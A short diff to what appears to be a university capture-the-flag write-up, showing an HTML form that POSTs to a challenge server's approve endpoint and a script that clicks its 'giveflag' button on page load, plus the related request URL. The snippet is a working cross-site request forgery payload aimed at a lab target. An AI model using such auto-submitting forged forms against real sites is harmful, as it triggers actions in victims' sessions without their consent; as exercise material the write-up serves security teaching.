@@ -1,4 +1,3 @@
-
 ```html
 <form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/ed6748362972777c957ca7f8495555b62bdee3aa/approve" role="form">     
     <div class="submit">                  
@@ -7,3 +6,5 @@
 </form>
 <script>document.getElementById("giveflag").click();</script>
 ```
+
+`http://ctf-fsi.fe.up.pt:5004/request/ed6748362972777c957ca7f8495555b62bdee3aa`
